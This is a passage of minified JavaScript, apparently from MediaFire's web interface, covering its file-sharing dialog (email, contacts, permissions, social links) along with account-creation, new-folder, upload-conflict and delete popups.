.popup").on("click",(function(e){aeV(e)})),a.delegate("#email_files_message","focusin",(function(e){$("#shareEnterText-msg").addClass("hide")})),a.delegate("#email_files_to","focusin",(function(e){$("#shareEnterText-email").addClass("hide")})),a.delegate("#email_files_message","focusout",(function(e){0==$(this).val().length&&$("#shareEnterText-msg").removeClass("hide")})),a.delegate("#email_files_to","focusout",(function(e){0==$(this).val().length&&$("#shareEnterText-email").removeClass("hide")})),a.delegate("input.gbtnPrimary","click",(function(e){$("#shareEnterText-email").removeClass("hide"),$("#shareEnterText-msg").removeClass("hide")})),a.delegate("input.ShareDialog-linkInput, a.ShareDialog-copyBtn","click",(function(e){$("#sharebox").hasClass("publicDisabled")&&$("#sharebox").addClass("disabledAlert")})),a.delegate(".tabs li[data-tab]","click",(function(e){var t=$(this).addClass("current").siblings().removeClass("current").end().data("tab"),o=$("#sharebox");o.hasClass("publicDisabled")&&("sharebox-email"==t||"sharebox-moreoptions"==t?o.addClass("disabledAlert"):"sharebox-contacts"!=t&&"sharebox-onetimedownload"!=t||o.removeClass("disabledAlert"));var n=a.find(".tabs"),r=n.children("div"),i=a.find("#"+t);r.filter(":visible").length;n.removeClass("tabs-collapsed"),o.removeClass("sharebox-moreoptions sharebox-email sharebox-onetimedownload").addClass(t),window.QC||Clipboard.isSupported()||i.find(".copy-link").hide(),aij("#share_socialnetworks_message","#sharebox-social .share-facebook .remaining",$("#fb_share_checkbox").data("input-length"),!0,(function(){return $("#fb_share_checkbox").is(":checked")})),aij("#share_socialnetworks_message","#sharebox-social .share-twitter .remaining",$("#tw_share_checkbox").data("input-length"),!0,(function(){return $("#tw_share_checkbox").is(":checked")})),aij("#email_files_message","#sharebox-email .remaining",128,!0),aeV(e)})),a.delegate("#sharebox-social :checkbox","change",(function(e){var t=$(this);t.is(":checked")?(t.parent().find("em.remaining").parent().show(),$("#share_socialnetworks_message").change()):t.parent().find("em.remaining").parent().hide(),aeV(e)})),a.delegate("#sharebox-social input:reset","click",(function(e){$(this).closest("ul").find(":checkbox").each((function(){var e=$(this);e.parent().find("em.remaining").html(e.data("input-length")),e.parent().find("em.remaining").parent().show()})),aeV(e)})),a.delegate("textarea.email-share-message","keydown",v).delegate("textarea.email-share-message","keyup",v),a.delegate("#sharebox-email input:reset","click",(function(){var e=$(this).closest("ul"),t=e.find("textarea.email-share-message");e.find("em.remaining").html(t.data("input-length"))})),a.delegate("#sharebox-email form","submit",(function(e){var t=a.find("#email_files_to").val();if(""==t)return Zi(0,"You need to type at least one email address into the 'Recipients Email' field."),e.preventDefault(),!1;var o=!0;return $.each(t.split(","),(function(t,a){""!=a&&0==/^.+@.+\..+$/i.test(a.trim())&&(Zi(0,"One or more Email Addresses in the 'Recipients Email' field are invalid."),e.preventDefault(),o=!1)})),o})),a.delegate("#add_contacts_message","keyup keydown change",(function(){var e=$(this),t=this.value.length,a=e.data("input-length");e.next().find("em.remaining").text(Math.max(0,a-t))})),a.delegate("#sharebox-contacts input:reset","click",(function(){var e=$(this).closest("ul"),t=e.find("#add_contacts_message");e.find("em.remaining").html(t.data("input-length"))})),a.delegate("#sharebox-contacts form","submit",(function(e){return""!=a.find("#give_permissions_to").val()||(Zi(0,"You must specify at least one contact."),e.preventDefault(),!1)})),a.delegate(".shareImportContacts","click",(function(e){var t=$(".shareImportContacts ul.importOptions");t.empty();for(var a in aJ)if("facebook"!=a||window.FB){var o=$("<li class='import"+aJ[a].title+"'>"+aJ[a].title+"</li>"),n=l[a];n&&o.addClass("importCompleted").append("<span>(Imported "+bdj(n)+")</span>"),t.append(o)}t.toggleClass("show")})),window.FB||(window.fbAsyncInit=function(){FB.init({version:FBAPIVersion.slice(0,-1),appId:FBAppId,status:!0,cookie:!0,oauth:!0,xfbml:!0})},c=document,f="script",u="facebook-jssdk",h=c.getElementsByTagName(f)[0],c.getElementById(u)||((p=c.createElement(f)).id=u,p.src="//connect.facebook.net/en_US/sdk.js",h.parentNode.insertBefore(p,h)));var w,b=$('<div class="contactBlocks"></div>'),_=$('<button type="button" aria-label="Remove contact">&#215;</button>'),k=$('<div class="autoSocialIcon"></div>'),x=$('<div class="shareContactRow"><span class="shareContactAvatar"></span><span class="shareContactName"></span><div class="currentContactPermissions"><a class="tooltip alt point-right">To add contacts from Facebook or Twitter, please log in to MediaFire.com</a><span class="canRead"><a href="javascript:void(0);">Can View</a></span><span class="canEdit"><a href="javascript:void(0);">Can Edit</a></span><span class="canManage"><a href="javascript:void(0);">Can Manage</a></span><span class="variedMsg"><a href="javascript:void(0);">Varies</a></span></div><button type="button" class="shareContactRemove" aria-label="Remove contact">&#215;</button><div class="shareContactRemoval">Remove <span class="contactRemovalName"></span>?<div><a href="#" class="cancelRemove">Cancel</a><a href="#" class="confirmRemove">Remove</a></div></div></div>');function H(e){var t=a.find("#add-contacts-field .contactBlocks").length,o=a.find(".shareContactRow[data-new-access]").length,n=!e&&atl($("#give_permissions_to").val()),r=t>0||o>0||n;a.find("#sharebox-contacts").toggleClass("saveContact",r),r&&($("div.ftContactAlert").removeClass("show"),a.find("#sharebox-contacts").removeClass("confirmContact"))}function C(){w=null,$("#currentPermissionsMenu").removeClass("show"),a.find(".shareContactRow.selected").removeClass("selected")}function S(){var e,t="contact-trie-raw",a=bkD(t,!0),o=new window.tH.aBS,n=new bjI("give_permissions_to"),r=function(){o.aDt({data:{method:"autocomplete",raw:"yes"}},(function(e){if(l(e),e&&localStorage){localStorage.removeItem("contact-trie");try{bgP(t,JSON.stringify(e))}catch(e){}}}))},i=function(t){try{J=JSON.parse(t)}catch(e){}return J&&J.response&&e.response?J.response.revision!=e.response.revision||J.response.epoch!=e.response.epoch?r():void l(J):r()};o.aDt({data:{method:"revision_only"}},(function(o){a?(e=o,bhb(t,i)):r()}));var l=function(e){if(e&&e.response&&e.response.data){$("#current-contactsWrap").show(),$("#sharebox-contacts").show();var t="undefined"!=typeof DesktopWebDomObject;n.bkI(e.response,s,t);var a=",;: ".split("");n.bkw((function(e,t,a,o){var n=$("#give_permissions_to").val();if(n.length>0&&atl(n,!0)&&(32==e.keyCode||186==e.keyCode||188==e.keyCode||0===o.length&&(9==e.keyCode||13==e.keyCode))){var r=n.replace(/[\s,;]+$/,""),i=b.clone().text(r).attr("data-contact-email",r).attr("data-contact-new",1);i.prepend(k.clone()),i.append(_.clone()),i.insertBefore("#add-contacts-input"),$(t).val(""),H()}H(o.length>0)}),(function(e,t,a){var o=b.clone().text(a.name).attr("data-contact-type",a.type).attr("data-contact-id",a.id);o.prepend(k.clone()),o.append(_.clone());var n=s[parseInt(a.type,10)];n&&o.addClass("import"+n),o.insertBefore("#add-contacts-input"),$(e).val(""),H();var r=$("#add-contacts-field")[0].scrollHeight;return $("#add-contacts-field").scrollTop(r),!1}),(function(e,t){$("#add-contacts-field .contactBlocks:last").remove(),H()}),(function(e,t,o){for(var n=0,r=!1,i=0;i<o.length;i++){var s=o[i];if(i===o.length-1||-1!==a.indexOf(s)){var l=o.slice(n,i+1).replace(/(^\s+|[\s,;:]+$)/g,"");if(atl(l,!0)){n=i+1;var d=b.clone().text(l).attr("data-contact-email",l).attr("data-contact-new",1);d.prepend(k.clone()),d.append(_.clone()),d.insertBefore("#add-contacts-input"),r=!0}}}if(r)return H(),e.preventDefault(),!1})),$("#sharebox-contacts").removeClass("loadingContactsWrap")}}}function E(e){var t=e.length,a=0;if($(".shareContactRow").not(".shareStatusBlock").remove(),$("#sharebox-contacts").removeClass("loadingContactsWrap"),0===t)return $("#current-contactsWrap").addClass("noFollowers").removeClass("removeAllShow removeAllConfirm"),void $("#sharebox-contacts").removeClass("existingContacts");$("#current-contactsWrap").removeClass("noFollowers removeAllConfirm").toggleClass("removeAllShow",t>=5),$("#sharebox-contacts").addClass("existingContacts");var o=[],i=[],l=$("#current-contacts");if(n.length+r.length>1){for(var d=0;d<n.length;d++)o.push(n[d].quickkey);for(d=0;d<r.length;d++)o.push(r[d].folderkey)}var c=function(e,t,a){var o=l.find('.shareContactRow[data-share-contact="'+e+'"]');o.length>0&&(o.attr("data-share-key",a),t&&o.addClass("variedPermission").data("share-access",0).find(".currentContactPermissions").removeClass("showCanEdit showCanRead showCanManage"))};for(d=-1;d<t&&e[++d];){var f=e[d].contact_key,u=e[d].resource_key,p=NZ(e[d]);if(1!=e[d].contact_indirect){if(o.length>0){var h=i[f];if(h&&h.length>2){if(h.push({key:u,access:p}),!h[0])for(var m=2;m<h.length;m++)if(h[1]+=","+u,h[m].access!=p){h[0]=!0;break}continue}i[f]=[!1,u,{key:u,access:p}]}var g=x.clone();if(g.find("span.shareContactName").text(e[d].display_name),e[d].avatar&&""!==e[d].avatar&&e[d].avatar.length>8){g.find("span.shareContactAvatar").css("background-image","url("+Encoder.XSSEncode(e[d].avatar)+")");var y=new Image;y.onerror=function(){g.find("span.shareContactAvatar")[0].style.backgroundImage=""},y.src=Encoder.XSSEncode(e[d].avatar)}var v="user",w=parseInt(e[d].contact_type,10),b=s[w];g.attr("data-share-access",p),g.attr("data-share-key",u),g.attr("data-share-contact",f),b&&(v=b.toLowerCase()),g.attr("data-share-type",v),"facebook"!=v&&"twitter"!=v||g.addClass("socialNetwork");var _="";1===NZ(e[d])&&(_+="showCanRead "),2===NZ(e[d])&&(_+="showCanEdit "),_=_||"showCanRead",g.find(".currentContactPermissions").addClass(_),$("#current-contacts").append(g)}else a++}if(o.length>0){var k=o.join();for(f in i){var H=i[f];if(H){var C=H[0],S=H[1];for(m=0;m<o.length;m++)if(!S||-1===S.indexOf(o[m])){C=!0;break}c(f,C,C?S:k)}}}$("#current-contacts").append('<div class="shareContactRow indirectContacts"><span class="indirectContactCount">'+a+"</span></div>")}function F(){if(acK)E([]);else{var e=n.length+r.length,t=new window.tH.aCa;if(1===e){var a=n[0]?n[0].quickkey:r[0].folderkey;t.jj({data:{resource:a}},(function(e){e.response.shares&&E(e.response.shares)}))}else{for(var o=[],i=0;i<n.length;i++)o.push(n[i].quickkey);for(i=0;i<r.length;i++)o.push(r[i].folderkey);t.hS((function(e){var t=e.response,a=[];if(t.shares)for(var n=0;n<t.shares.length;n++)-1!==o.indexOf(t.shares[n].resource_key)&&a.push(t.shares[n]);E(a)}))}}}a.delegate("#add-contacts-field","click",(function(e){document.getElementById("give_permissions_to").focus()})),a.delegate("#give_permissions_to","focus click",(function(e){$("#sharebox-contacts").hasClass("saveContact")||$("div.ftContactAlert").addClass("show"),$("#shareEnterText-contacts").addClass("hide")})),a.delegate("#give_permissions_to","blur",(function(e){$("div.ftContactAlert").removeClass("show"),""===this.value&&0===a.find(".contactBlocks").length&&$("#shareEnterText-contacts").removeClass("hide")})),a.delegate("ul.importOptions li","click",(function(e){var t=$(this).text().toLowerCase().split("(")[0].trim();var a=aJ[t];a?($("#sharebox-contacts").addClass("importingContactsWrap").removeClass("importingContactsProgress"),a.BeginAuth((function(){}),(function(e){Zi(0,"Import error: '"+e+"'"),$("#sharebox-contacts").removeClass("importingContactsWrap importingContactsProgress")}),(function(e){Zi(0,void 0!==e?"Import failed: '"+e+"'":"Import failed"),$("#sharebox-contacts").removeClass("importingContactsWrap importingContactsProgress")}),(function(e){l[t]=blZ(),Zi(0,"Successfully imported/updated "+e+" contact"+(1!=e?"s":"")),$("#sharebox-contacts").removeClass("importingContactsWrap importingContactsProgress"),S()}))):Zi(0,"Cannot import from "+$(this).html()+", please choose another import method if available.")})),a.delegate(".shareContactRow .currentContactPermissions","click",(function(e){var t=$(this).parent();if(w&&t.is(w))C();else{if(t.hasClass("socialNetwork")&&$("#sharebox").hasClass("web-widget"))return C(),!1;a.find(".shareContactRow.selected").removeClass("selected");var o=70;w=t,$("#current-contacts div.shareContactRow").length>4&&(o+=bml()[0]);var n=w.find(".currentContactPermissions")[0].className.replace("currentContactPermissions","");w.addClass("selected"),$("#currentPermissionsMenu").css({top:w.offset().top-$(".FollowersDialog").offset().top+45,right:o})[0].className="currentPermissions show "+n}})),a.delegate("#currentPermissionsMenu li","click",(function(e){if(w){var t=0,a="";"canRead"==this.className&&(t|=1,a+="showCanRead "),"canEdit"==this.className&&(t|=2,a+="showCanEdit "),"canManage"==this.className&&(t|=4,a+="showCanManage "),w.data("share-access")!=t?w.attr("data-new-access",t):w.removeAttr("data-new-access"),w.find(".currentContactPermissions").removeClass("showCanManage showCanEdit showCanRead").addClass(a),C(),H()}})),a.delegate("#addContactPermissions, .shareImportContacts, .currentContactPermissions","click",(function(e){var t=this,a=function(e){var o=-1===t.className.indexOf("currentContactPermissions")||"addContactPermissions"==t.id?t:$("#currentPermissionsMenu")[0];void 0===o?$(this).off("mousedown",a):$.contains(o,e.target)||(C(),$("#addContactPermissions ul, .shareImportContacts ul").removeClass("show"),$(this).off("mousedown",a))};$(document).on("mousedown",a)})),a.delegate("#add-contacts-field .contactBlocks button","click",(function(e){$(this).parent().remove(),H()})),a.delegate(".shareContactSave a","click",(function(e){C();var t=0,o=$("#addContactPermissions");o.hasClass("showCanRead")&&(t|=1),o.hasClass("showCanEdit")&&(t|=2),o.hasClass("showCanManage")&&(t|=4);var i=[],l=[],d=$(".shareContactRow[data-new-access]"),c=d.filter('[data-share-type="facebook"]').length>0,f=d.filter('[data-share-type="twitter"]').length>0,u=$("#give_permissions_to"),p=u.val().replace(/[\s,;]+$/,"");p.length>0&&atl(p,!0)&&(l.push(p),u.val(""),H()),$GLB_aContactBlocks=a.find(".contactBlocks");for(var h=0;h<$GLB_aContactBlocks.length;h++){$GLB_aContactBlock=$GLB_aContactBlocks.eq(h);var m=s[$GLB_aContactBlock.data("contact-type")];if(m&&(c||"Facebook"!=m||(c=!0),f||"Twitter"!=m||(f=!0)),1==$GLB_aContactBlock.data("contact-new")){var g=$GLB_aContactBlock.data("contact-email");atl(g,!0)&&l.push(g)}else i.push($GLB_aContactBlock.data("contact-id"))}u.val("");var y=[];function v(){!function(e,t,o,i,s){var l=!1,d=new window.tH.aCa,c=[];(r[0]||n[0]).shared&&(l=!0);for(var f=0;f<n.length;f++)c.push(n[f].quickkey);for(f=0;f<r.length;f++)c.push(r[f].folderkey);var u=function(e){$("#sharebox-contacts").removeClass("loadingContactsWrap"),Zi(0,e),H()},p=function(){var a={data:{}};if(o){var n=new Date,r=n.getMonth(),s=r<10?"0"+r:""+r,f=n.getDate(),p=f<10?"0"+f:""+f,h=""+n.getFullYear();a.data.message=JSON.stringify({template:"standard",title:"Share Notification",subtitle:o,date:s+"-"+p+"-"+h,attachments:[]}),a.data.broadcast_class="share"}l?(a.data.contact_keys=e,a.data.keys=c.join(),i.fb_access_token&&(a.data.fb_access_token=i.fb_access_token),i.tw_oauth_token&&(a.data.tw_oauth_token=i.tw_oauth_token),i.tw_oauth_token_secret&&(a.data.tw_oauth_token_secret=i.tw_oauth_token_secret),d.hV(a,(function(){F()}))):(a.data.contacts=e,a.data.resources=c.join(),a.data.permissions=t,i.fb_access_token&&(a.data.fb_access_token=i.fb_access_token),i.tw_oauth_token&&(a.data.tw_oauth_token=i.tw_oauth_token),i.tw_oauth_token_secret&&(a.data.tw_oauth_token_secret=i.tw_oauth_token_secret),d.hH(a,{success:function(e){Rn(a),F()},error:function(e,t,a){var o={232:["You must verify your email address."]}[JSON.parse(e.responseText).response.error.toString()]||["An error occurred while sharing this resource."];u(o[0])}}))},h=a.find(".shareContactRow[data-new-access]"),m=function(t){var a=h.eq(t),n=a.data("new-access"),r=a.data("share-contact"),s={data:{}};if(o){var f=new Date,g=f.getMonth(),y=g<10?"0"+g:""+g,v=f.getDate(),w=v<10?"0"+v:""+v,b=""+f.getFullYear();arl.data.message=JSON.stringify({template:"standard",title:"Share Notification",subtitle:o,date:y+"-"+w+"-"+b,attachments:[]}),arl.data.broadcast_class="share"}var _={success:function(a){h[t+1]?m(t+1):e?p():F()},error:function(e,t,a){var o={232:["You must verify your email address."]}[JSON.parse(e.responseText).response.error.toString()]||["An error occurred while sharing this resource."];u(o[0])}};l?(s.data.contact_keys=r,s.data.keys=c.join(),i.fb_access_token&&(s.data.fb_access_token=i.fb_access_token),i.tw_oauth_token&&(s.data.tw_oauth_token=i.tw_oauth_token),i.tw_oauth_token_secret&&(s.data.tw_oauth_token_secret=i.tw_oauth_token_secret),d.hV(s,_)):(s.data.contacts=r,s.data.resources=c.join(),s.data.permissions=n,i.fb_access_token&&(s.data.fb_access_token=i.fb_access_token),i.tw_oauth_token&&(s.data.tw_oauth_token=i.tw_oauth_token),i.tw_oauth_token_secret&&(s.data.tw_oauth_token_secret=i.tw_oauth_token_secret),d.hH(s,_))};s?function(){for(var t=new window.tH.aBS,a=[],o=s.split(","),n=0;n<o.length;n++)a.push({email:$.trim(o[n])});var r={contact_type:"user",contacts:JSON.stringify(a)};t.ZD({data:r},{success:function(t){t.response&&t.response.contact_keys&&(e=e.length>0?e+","+t.response.contact_keys:t.response.contact_keys),h.length>0?m(0):e?p():F()},error:function(e,t,a){var o={108:["Invalid user specified. Unable to create contact."]}[JSON.parse(e.responseText).response.error.toString()]||["An error occurred while adding new contacts."];u(o[0])}})}():h.length>0?m(0):e?p():F()}(i.join(),t,$("#add_contacts_message").val(),y,l.join()),$("#add_contacts_message").val("").trigger("change"),$GLB_aContactBlocks.remove(),a.find("#sharebox-contacts").removeClass("saveContact").addClass("confirmContact"),a.find(".auto-complete").addClass("empty")}function w(){if(c)return window.FB?void FB.getLoginStatus((function(e){if("connected"==e.status){var t=FB.getAuthResponse(),o=t?t.accessToken:"";y.fb_access_token=o,v()}else FB.login((function(e){"connected"==e.status?FB.api(FBAPIVersion+"me/permissions",(function(e){var t=FB.getAuthResponse(),a=t?t.accessToken:"";y.fb_access_token=a,v()})):(Zi(0,"Facebook login failed"),a.find("#sharebox-contacts").removeClass("confirmContact").addClass("saveContact"))}),{scope:"xmpp_login"})})):(Zi(0,"Facebook load failed"),void a.find("#sharebox-contacts").removeClass("confirmContact").addClass("saveContact"));v()}return function(){if(f){if(""!=aL("oauth_token")&&""!=aL("oauth_token"))return y.tw_oauth_token=aL("oauth_token"),y.tw_oauth_token_secret=aL("oauth_token_secret"),void w();aJ.twitter.BeginAuth($.noop,(function(e){Zi(0,"Twitter login error: '"+e+"'"),a.find("#sharebox-contacts").removeClass("confirmContact").addClass("saveContact")}),(function(e){Zi(0,void 0!==e?"Twitter login failed: '"+e+"'":"Twitter login failed"),a.find("#sharebox-contacts").removeClass("confirmContact").addClass("saveContact")}),(function(e){y.tw_oauth_token=aL("oauth_token"),y.tw_oauth_token_secret=aL("oauth_token_secret"),w()}),!0)}else w()}(),$("#sharebox-contacts").addClass("loadingContactsWrap"),!1})),a.delegate(".shareContactConfirm a","click",(function(e){a.find("#sharebox-contacts").removeClass("confirmContact")})),a.delegate("#removeAllFollowers a","click",(function(e){var t=$(this);switch(t.data("command")){case"prompt":t.closest("#current-contactsWrap").addClass("removeAllConfirm");break;case"confirm":for(var a=new window.tH.aCa,o=[],i=0;i<n.length;i++)o.push(n[i].quickkey);for(i=0;i<r.length;i++)o.push(r[i].folderkey);C(),E([]);var s={data:{}};s.data.resources=o.join(),a.im(s,(function(){Rn(s)}));case"cancel":default:t.closest("#current-contactsWrap").removeClass("removeAllConfirm")}return!1})),a.delegate(".shareContactRemove","click",(function(e){if(C(),a.find(".inset-box.warning").children().filter(":visible").length>0)return!1;var t=$(this).parent();return t.addClass("selected"),t.find(".contactRemovalName").text(t.find(".shareContactName").text()),$("#sharebox").addClass("removeContact"),!1})),a.delegate(".shareContactRemoval a.confirmRemove","click",(function(e){for(var t,o=new window.tH.aCa,i=[],s=0;s<n.length;s++)i.push(n[s].quickkey);for(s=0;s<r.length;s++)i.push(r[s].folderkey);var l=a.find(".shareContactRow.selected");t=l.data("share-contact"),C(),l.remove(),$("#sharebox").removeClass("removeContact");var d=$(".shareContactRow").not(".shareStatusBlock").length;if(0===d?($("#current-contactsWrap").addClass("noFollowers").removeClass("removeAllShow removeAllConfirm"),$("#sharebox-contacts").removeClass("existingContacts")):($("#current-contactsWrap").removeClass("noFollowers removeAllConfirm").toggleClass("removeAllShow",d>=5),$("#sharebox-contacts").addClass("existingContacts")),t){var c={data:{}};c.data.contact=t,c.data.resources=i.join(),o.im(c,(function(){Rn(c)}))}return H(),!1})),a.delegate(".shareContactRemoval a.cancelRemove","click",(function(e){return C(),$("#sharebox").removeClass("removeContact"),!1}));var I={blogger:"http://www.blogger.com/blog_this.pyra?t&u=[url]&n=[text]",facebook:"https://www.facebook.com/sharer/sharer.php?u=[url]",plus:"https://plus.google.com/share?url=[url]",twitter:"https://twitter.com/intent/tweet?url=[url]&text=[text]&related=mediafire",email:"mailto:?body=[text]%0A[url]",reddit:"https://reddit.com/submit?url=[url]&title=[text]",linkedin:"https://www.linkedin.com/shareArticle?mini=true&url=[url]"};return a.delegate(".ShareDialog-socialLinks a","click",(function(e){var t=aBO()?"dev.mediafire.com":"www.mediafire.com",o=$(".ShareDialog-linkInput",a).val().split("/");o.splice(0,3);var i=encodeURIComponent(location.protocol+"//"+t+"/"+o.join("/")),s=$("#add_contacts_message",a).val();s&&(s=encodeURIComponent(s));var l=location.protocol+"//"+t+"/images/filetype/download/folder.jpg",d=$(this).attr("class").toLowerCase().replace("sharedialog-",""),c=I[d];if(!c)return!1;var f=["app","css","doc","music","pdf","php","ppt","video","web","xls","zip"];if(1==n.length&&0==r.length){var u=n[0];if("image"==u.filetype)l=u.imageUrl,!0;else{l=location.protocol+"//"+location.host+"/images/filetype/download/";var p=u.filename.split("."),h=p[p.length-1];-1!=$.inArray(h,f)?l+=h:-1!=$.inArray(u.filetype,f)?l+=u.filetype:"audio"==u.filetype?l+="music":l+="default",l+=".jpg"}}l=encodeURIComponent(l);var m=$(".popup-title",a).text().replace("Share: ","").trim();s||(s=encodeURIComponent(m)),s||(s=1==n.length&&0==r.length?encodeURIComponent(n[0].filename):0==n.length&&1==r.length?encodeURIComponent(r[0].name):encodeURIComponent("Sharing multiple files")),c=(c=(c=c.replace("[url]",i)).replace("[text]",s)).replace("[media]",l);try{top.open(c,"_blank")}catch(e){top.postMessage("mf-open-"+c,"*")}return!1})),a.keydown((function(e){return 27!=(e=e||window.event).keyCode||(a.find("input").blur(),$("a.popup-close:visible").focus(),$("a.popup-close:visible").trigger("click"),aeV(e),!1)})),{popup:o,ali:d,Show:function(e,t,a,o,i,s){var d=!1,c=!1;if(!(r.length>0&&n.length>0)){var f=function(e){e.shared&&(c=!0,0==NZ(e)&&(d=!0))},u=r.length,p=n.length;if(u>0)for(var h=0;h<u&&(!c||!d);h++)f(r[h]);if(p>0)for(h=0;h<p&&(!c||!d);h++)f(n[h]);o&&(l=o),g(e,!0,t,d,c,a,i,s)}},ShowBasic:g,ShowTab:function(e,t){a.find(".tabs li[data-tab=sharebox-"+e+"]").click(),"fb"==t&&a.find("#tw_share_checkbox").click(),"tw"==t&&a.find("#fb_share_checkbox").click()},Hide:y,Clear:function(){n=[],r=[],d(!1)},akb:function(e,t,a,o,n){n||(n=0),r.push({name:e,folderkey:t,privacy:a,shared:o,permissions:n})},ald:function(e,t,a,o,r,i,s,l,d){d||(d=0),n.push({filename:t,filetype:o,hash:r,quickkey:e,size:a,viewable:i,privacy:s,shared:l,permissions:d})}}}()}function ajj(){var e=$("#create_new_account_popup").popup(),t=e.data("popup");return e.html(templates.create_account()),e.delegate("#create_new_account_form","submit keyup focus blur",(function(e){var t=0;switch(e.type){case"submit":t=-1;break;default:t=0}return akc=!0,$("#create_new_account_form :input:eq(0)").val().length>t&&($("#create_new_account_form :input:eq(0)").val().length<=3||!aoF($("#create_new_account_form :input:eq(0)").val()))?($(".anon-form-section:eq(0) div.Form-inputStatusIcon").removeClass("is-valid"),$(".anon-form-section:eq(0) div.Form-inputStatusIcon").addClass("is-notValid"),akc=!1):$("#create_new_account_form :input:eq(0)").val().length>t?($(".anon-form-section:eq(0) div.Form-inputStatusIcon").removeClass("is-notValid"),$(".anon-form-section:eq(0) div.Form-inputStatusIcon").addClass("is-valid")):$(".anon-form-section:eq(0) div.Form-inputStatusIcon").removeClass("is-valid").removeClass("is-notValid"),$(),$("#create_new_account_form :input:eq(0)").val().length>t&&($("#create_new_account_form :input:eq(1)").val().length<=3||!aoF($("#create_new_account_form :input:eq(1)").val()))?($(".anon-form-section:eq(1) div.Form-inputStatusIcon").removeClass("is-valid"),$(".anon-form-section:eq(1) div.Form-inputStatusIcon").addClass("is-notValid"),akc=!1):$("#create_new_account_form :input:eq(0)").val().length>t?($(".anon-form-section:eq(1) div.Form-inputStatusIcon").removeClass("is-notValid"),$(".anon-form-section:eq(1) div.Form-inputStatusIcon").addClass("is-valid")):$(".anon-form-section:eq(1) div.Form-inputStatusIcon").removeClass("is-notValid").removeClass("is-valid"),($("#create_new_account_form :input:eq(2)").val().length<6||$("#create_new_account_form :input:eq(2)").val().length>15)&&$("#create_new_account_form :input:eq(0)").val().length>t?($(".anon-form-section:eq(2) div.Form-inputStatusIcon").removeClass("is-valid"),$(".anon-form-section:eq(2) div.Form-inputStatusIcon").addClass("is-notValid"),akc=!1):$("#create_new_account_form :input:eq(0)").val().length>t?($(".anon-form-section:eq(2) div.Form-inputStatusIcon").removeClass("is-notValid"),$(".anon-form-section:eq(2) div.Form-inputStatusIcon").addClass("is-valid")):$(".anon-form-section:eq(2) div.Form-inputStatusIcon").removeClass("is-notValid").removeClass("is-valid"),($("#create_new_account_form :input:eq(3)").val().length<6||$("#create_new_account_form :input:eq(3)").val().length>15)&&$("#create_new_account_form :input:eq(0)").val().length>t?($(".anon-form-section:eq(3) div.Form-inputStatusIcon").removeClass("is-valid"),$(".anon-form-section:eq(3) div.Form-inputStatusIcon").addClass("is-notValid"),akc=!1):$("#create_new_account_form :input:eq(0)").val().length>t&&($(".anon-form-section:eq(3) div.Form-inputStatusIcon").removeClass("is-notValid"),$(".anon-form-section:eq(3) div.Form-inputStatusIcon").addClass("is-valid")),$("#create_new_account_form :input:eq(0)").val()!=$("#create_new_account_form :input:eq(1)").val()&&($(".anon-form-section:eq(1) div.Form-inputStatusIcon").removeClass("is-valid"),$(".anon-form-section:eq(1) div.Form-inputStatusIcon").addClass("is-notValid"),akc=!1),$("#create_new_account_form :input:eq(2)").val()!=$("#create_new_account_form :input:eq(3)").val()&&($(".anon-form-section:eq(3) div.Form-inputStatusIcon").removeClass("is-valid"),$(".anon-form-section:eq(3) div.Form-inputStatusIcon").addClass("is-notValid"),akc=!1),akc})),e.delegate(".close","click",(function(e){$('div[id^="MediaFireUploaderSWFDiv"]').show(),t.close(),aeV(e)})),e.delegate(".login_link","click",(function(e){blX("Login"),t.close(),aeV(e)})),e.find(":input[name=reg_emailUL]").bind("keyup",(function(){$(".anon-signup-confirm:eq(0)").show(500)})),e.find(":input[name=reg_passUL]").bind("keyup",(function(){$(".anon-signup-confirm:eq(1)").show(500)})),e.keydown((function(t){return 13==(t=t||window.event).keyCode?(e.find(".confirm").trigger("click"),!1):27!=t.keyCode||(e.find("input").blur(),$("a.popup-close:visible").trigger("click"),aeV(t),!1)})),{open:function(){$('div[id^="MediaFireUploaderSWFDiv"]').hide(),e.find(":input[name=reg_passUL]").val("").end().find(":input[name=reg_passUL2]").val("").end(),t.open(),e.find(":input[name=reg_emailUL]").focus()},popup:t,close:t.close}}function awJ(e,t,a){e.keydown((function(o){return 13==(o=o||window.event).keyCode&&t?(e.find(".confirm").trigger("click"),!1):27!=o.keyCode||!a||(e.find("input").blur(),$("a.popup-close:visible").trigger("click"),aeV(o),!1)}))}function asx(e,t){return a=$(e).popup(),o=a.data("popup"),n=[],awJ(a,!0,!0),{open:function(e){a.html(t.folder_share_rss(apO(e))),o.open(),Clipboard.isSupported()?(n.forEach((function(e){e&&e.destroy()})),n=[],a.find(".copy-link").each((function(e,t){var a=new Clipboard(t,{text:function(e){return $(e).prev().val()}});a.on("success",(function(e){Zi(0,"Copied to Clipboard")})),n.push(a)})),a.find("input").focus()):a.find(".copy-link").hide()},popup:o,close:o.close};var a,o,n}function aVH(e,t){return function(){var a=$(e).popup(),o=a.data("popup");$(a[0].parentNode.parentNode).find("a.popup-close").remove();var n=void 0,r="keep";return a.delegate("button","click",(function(e){var t=this.id.substr(8)||r;aVP=document.getElementById("applyAll").checked,n&&(n(t,aVP),n=void 0),o.close(),aeV(e),$(document).focus()})),a.keydown((function(e){return 13!=(e=e||window.event).keyCode&&27!=e.keyCode||(a.find(".primary").trigger("click"),!1)})),{open:function(e,i,s,l,d){n=d,r=s,new window.tH.Cp(i).Yw((function(n){(e=$.extend({},n.response.file_info,e)).size=formatBytes(e.size),e.created=bdj(e.created,!0),a.html(t.pop_upload_conflict(e)),o.open(),a.find("#applyAll").parent().toggle(l),a.find("#confirm-"+r).removeClass("secondary").addClass("primary").focus()}))},popup:o,close:o.close}}()}function ri(e,t){return a=$(e).popup(),o=a.data("popup"),a.delegate(".confirm","click",(function(e){var t=$.trim(a.find("#create-folder-name").val());t.length>0?(LF.Wt(a.find("input.folder").val(),t,{filedrop:$("#folder-filedrop-checkbox").is(":checked")}),a.find("#create-folder-name").val("").blur(),o.close(),aeV(e),$(document).focus()):(Zi(0,"Folder name cannot be left blank."),a.find("#create-folder-name").val(t).focus())})),awJ(a,!0,!0),{open:function(e,n){a.html(t.pop_subfolder()),a.find("input.folder").val(e),!0===n&&a.find("li.enableFileDrop").hide(),o.open(),a.find("#create-folder-name").val("").focus()},popup:o,close:o.close};var a,o}function avA(e,t){return o=$(e).popup(),n=o.data("popup"),o.delegate(".confirm","click",(function(e){try{window.akF(a.quickkeys)}catch(e){}LF.Zs(a.quickkeys.join(","),a.Bz.join(",")),n.close(),aeV(e)})),awJ(o,!0,!1),{open:function(e,r,i){$.isArray(e)||(e=e?e.split(","):new Array),$.isArray(r)||(r=r?r.split(","):new Array),o.html(t.pop_delete());var 